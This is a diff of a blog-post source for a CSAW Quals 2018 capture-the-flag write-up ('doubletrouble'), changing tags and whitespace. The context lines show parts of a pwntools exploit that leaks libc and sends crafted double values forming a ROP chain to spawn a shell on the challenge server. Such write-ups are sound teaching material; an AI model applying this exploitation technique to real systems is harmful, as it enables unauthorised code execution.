@@ -3,11 +3,10 @@ title: CSAW Quals 18 - doubletrouble
 date: '2018-09-17'
 lastmod: '2019-04-07T13:46:27+02:00'
 categories:
-- ctf_csawquals18
 - writeup
 - csawquals18
 tags:
-- exploitation
+- pwn
 authors:
 - andreafioraldi
 ---
@@ -123,9 +122,9 @@ while True:
     p = remote("pwn.chal.csaw.io", 9002)
 
     try:
-        
+
         ### STAGE 1 - leak libc a restart main
-        
+
         stack = int(p.recvline(False), 16)
 
         l = 64
@@ -152,10 +151,10 @@ while True:
         print "LIBC: ", hex(libc.address), hex(libc.symbols["system"])[2:]
 
         p.recvuntil("68:") + p.recvline(False)
-        
-        
+
+
         ### STAGE 2 - execute system("/bin/sh")
-        
+
         stack = int(p.recvline(False), 16)
 
         l = 64
@@ -163,10 +162,10 @@ while True:
 
         v = hex_to_double(("0804900a0804900a")) #0x0804900a : ret
         p.sendafter("Give me: ", repr(v) + "\n")
-        
+
         v = hex_to_double("0804A0D5" + hex(libc.symbols["system"])[2:])
         p.sendafter("Give me: ", repr(v) + "\n")
-        
+
         bin_sh = libc.address + 0x17e0cf
         v = hex_to_double(("09049786" + hex(bin_sh)[2:]))
         p.sendafter("Give me: ", repr(v) + "\n")
@@ -179,7 +178,7 @@ while True:
 
         p.recvuntil("Sorted Array:")
         p.recvuntil("0:")
-        
+
         p.interactive()
         p.close()
     except KeyboardInterrupt:
